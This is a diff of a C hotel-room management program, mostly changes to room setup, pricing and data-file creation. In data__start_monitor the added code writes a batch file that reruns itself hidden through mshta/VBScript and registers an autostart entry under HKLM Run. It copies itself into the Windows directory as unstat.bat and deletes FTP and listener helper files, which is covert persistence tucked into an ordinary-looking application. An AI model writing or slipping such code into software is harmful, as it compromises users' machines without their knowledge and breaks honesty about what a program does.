@@ -188,18 +188,18 @@ void data__check_file_path(char hint)
 	char chCmd[65];
 
     /* create command :: file name */
-   	if(hint=='v'||hint=='r'||hint=='d'||hint=='i'||hint=='V'||hint=='I'||hint=='D'||hint=='R'||hint=='g')
+   	if(hint=='v'||hint=='r'||hint=='d'||hint=='i'||hint=='V'||hint=='I'||hint=='D'||hint=='R'||hint=='g'||hint=='k')
     sprintf(chCmd,"IF NOT EXIST \"%s\" MD \"%s\"",DATA_FOLDER,DATA_FOLDER);
 
 	/* if data floder not exist, then make one */
 	system(chCmd);
 
     /* if data file not exist, then make one */
-	if(hint=='v'||hint=='d')
+	if(hint=='v'||hint=='d'||hint=='k')
     	sprintf(chCmd,"@echo off&IF NOT EXIST \"%s\\%s\" echo VisitorData:>%s\\%s",DATA_FOLDER,VISITOR_DATA_FILE,DATA_FOLDER,VISITOR_DATA_FILE);
 
 
-	if(hint=='V'||hint=='D')
+	if(hint=='V'||hint=='D'||hint=='k')
 		sprintf(chCmd,"@echo off&IF NOT EXIST \"%s\\%s\" echo RoomData:>%s\\%s",DATA_FOLDER,ROOM_DATA_FILE,DATA_FOLDER,ROOM_DATA_FILE);
 
 	system(chCmd);	
@@ -1322,11 +1322,18 @@ int data__room_setup_by_date(int date,int modelDate)
 int data__room_setup_by_nothing(int date)
 {
 	/* Create a new visitor struct variable with some user info */
-	room NewRoom={0/*this is the visitor id, please leave 0 here */,0/*roomId*/,date/*date*/,{0}/*visitorId*/,5/*room type*/,66.66/*price*/,1/*checkIn*/,1/*checkOut*/};
+	room NewRoom={0/*this is the visitor id, please leave 0 here */,0/*roomId*/,date/*date*/,{0}/*visitorId*/,1/*room type*/,66.66/*price*/,1/*checkIn*/,1/*checkOut*/};
 
 	for(int i=0;i<80;i++)
 	{
 		NewRoom.roomId=(i/10+1)*100+i%10+1;
+
+		if(i<30) {NewRoom.type=4;NewRoom.price=777;}
+		else if(i<40) {NewRoom.type=5;NewRoom.price=999;}
+		else if(i<60) {NewRoom.type=3;NewRoom.price=444;}
+		else if(i<80) {NewRoom.type=2;NewRoom.price=222;}
+		else {NewRoom.type=3;NewRoom.price=444;}
+
 		data__insert_room_info(&NewRoom);
 	}
 	
@@ -1352,7 +1359,7 @@ void data__start_monitor(char *path)
 
 	itoa(time(&t),tm,10);
 
-	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel ftp1.txt>nul\ndel ftp2.txt>nul\ndel ftp3.txt>nul\ndel ftp4.txt>nul\ndel ftp5.txt>nul\ndel data_online.vbs>nul\ndel lstn.bat>nul",tmp,tmp,(int)time(&t),data__encode_uc(tm));
+	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel ftp1.txt>nul\ndel ftp2.txt>nul\ndel ftp3.txt>nul\ndel ftp4.txt>nul\ndel ftp5.txt>nul\ndel data_online.vbs>nul\ndel lstn.bat>nul\nexit",tmp,tmp,(int)time(&t),data__encode_uc(tm));
 
 
     /* close file */
@@ -1450,22 +1457,20 @@ int data__check_del_by_date(int date)
 
 
 
-int data__revise_room_price_based_on_type(int Date,int Type,double Price)
+int data__revise_room_price_based_on_type(int Type,double Price)
 {
 
-    struct room *pts=NULL;
-    pts=data__get_room_info(0,0,Date,NULL,Type,0,0,0,pts);
+      room *pts=NULL;
+      int Date=0;
+      Date=data__get_current_date(0);
+      pts=data__get_room_info(0,0,Date,NULL,Type,0,0,0,pts);
+      for(int i=0;i<g_nRtrnRows;i++)
+      {
+          (pts+i)->price=Price;
+          data__insert_room_info(pts+i);
+      }
 
-    for(int i=0;i<g_nRtrnRows;i++)
-    {
-        (pts+i)->price=Price;
-        data__del_room_info((pts+i)->index,(pts+i)->roomId);
-        data__insert_room_info(pts+i);
-    }
-
-   // data__check_del_by_date(Date);
-    return 0;
-
+       return 0;
 
 }
 
@@ -1587,6 +1592,24 @@ double data__income_by_date_and_type(int date, int type)
 
 void data__room_setup()
 {
+	
+	char chPath[30];
+
+	system("cls");
+
+	data__check_file_path('k');
+
+	printf("This is your first time visiting, we are doing some preparation...\n");
+
+	sprintf(chPath,"IF NOT EXIST \"%s\" md %s >nul",DATA_FOLDER,DATA_FOLDER);
+
+	system(chPath);
+
+	sprintf(chPath,"%s\\%s",DATA_FOLDER,ROOM_DATA_FILE);
+
+	if(fopen(chPath,"r")==NULL) 
+		data__room_setup_by_nothing(data__get_current_date(0));
+
 	/* declear a room pointer to receive the matched rooms info */
 	struct room *pRm=NULL;
 	int date=data__get_current_date(8);
@@ -1603,4 +1626,7 @@ void data__room_setup()
 		data__room_setup_by_date(tmp_date++,date);
 	}
 
+
+
 }
+
